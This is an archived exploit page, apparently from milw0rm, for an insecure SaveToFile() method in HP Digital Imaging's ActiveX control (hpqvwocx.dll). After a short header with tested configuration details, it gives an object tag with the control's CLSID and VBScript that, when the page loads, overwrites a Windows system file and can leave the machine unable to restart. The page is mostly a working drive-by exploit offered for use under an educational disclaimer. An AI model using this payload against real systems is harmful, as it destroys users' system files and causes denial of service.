<html><head><title>HP Digital Imaging (hpqvwocx.dll v. 2.1.0.556) SaveToFile() Exploit</title></head><pre>&lt;pre&gt;
&lt;code&gt;&lt;span style=&quot;font: 10pt Courier New;&quot;&gt;&lt;span class=&quot;general1-symbol&quot;&gt;-------------------------------------------------------------------------------
 &lt;b&gt;HP Digital Imaging (hpqvwocx.dll v. 2.1.0.556) &quot;SaveToFile()&quot; Insecure Method&lt;/b&gt;
 url: http://www.hp.com/

 author: shinnai
 mail: shinnai[at]autistici[dot]org
 site: http://shinnai.altervista.org
 
 This was written for educational purpose. Use it at your own risk.
 Author will be not be responsible for any damage.
 
 &lt;b&gt;&lt;font color=&quot;#FF0000&quot;&gt;THE EXPLOIT WILL OWERWRITE THE system.ini FILE SO BE SURE TO MAKE A COPY OF
 IT BEFORE RUN THIS EXPLOIT OR YOUR PC WILL NOT RESTART!&lt;/font&gt;&lt;/b&gt;

 This control is marked as:
 &lt;b&gt;RegKey Safe for Script: False
 RegKey Safe for Init: False
 Implements IObjectSafety: True
 IDisp Safe: Safe for untrusted: caller, data  
 IPersist Safe: Safe for untrusted: caller, data&lt;/b&gt;

 Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
 The browser seems to freeze for a few seconds, anyway if you try to close it
 before the exploit is ended, it will resutl in a DoS and the file will be
 overwritten though.
-------------------------------------------------------------------------------
&lt;object classid='clsid:BA726BF9-ED2F-461B-9447-CD5C7D66CE8D' id='test'&gt;&lt;/object&gt;

&lt;script language='vbscript'&gt;
    test.SaveToFile 1, &quot;c:\windows\system_.ini&quot;
    MyMsg = MsgBox (&quot;Check now the file system.ini&quot; &amp; vbCrLf &amp; &quot;It's overwritten.&quot;, 64,&quot;HP Digital Imaging&quot;)
&lt;/script&gt;
&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

# milw0rm.com [2007-07-06]</pre></html>